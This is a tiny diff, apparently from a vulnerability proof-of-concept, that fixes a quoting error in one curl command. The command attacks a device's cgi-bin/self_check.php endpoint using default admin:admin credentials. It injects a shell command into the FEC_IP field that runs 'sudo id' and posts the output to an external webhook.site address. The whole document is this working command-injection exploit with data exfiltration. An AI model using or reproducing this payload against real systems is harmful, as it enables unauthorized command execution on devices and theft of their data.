@@ -23,4 +23,4 @@ FEC_IP=$(wget%20--post-data%20"$(sudo%20id)"%20http://webhook.site/xx/)&WIFI_IP=
 
 
 
-curl -X POST http://xx:xx/cgi-bin/self_check.php -d 'FEC_IP=$(wget%20--post-data%20"$(sudo%20id)"%20http://webhook.site/xx/)&WIFI_IP=test&proc_step=1' -H 'Authorization: Basic YWRtaW46YWRtaW4=
+curl -X POST http://xx:xx/cgi-bin/self_check.php -d 'FEC_IP=$(wget%20--post-data%20"$(sudo%20id)"%20http://webhook.site/xx/)&WIFI_IP=test&proc_step=1' -H 'Authorization: Basic YWRtaW46YWRtaW4='
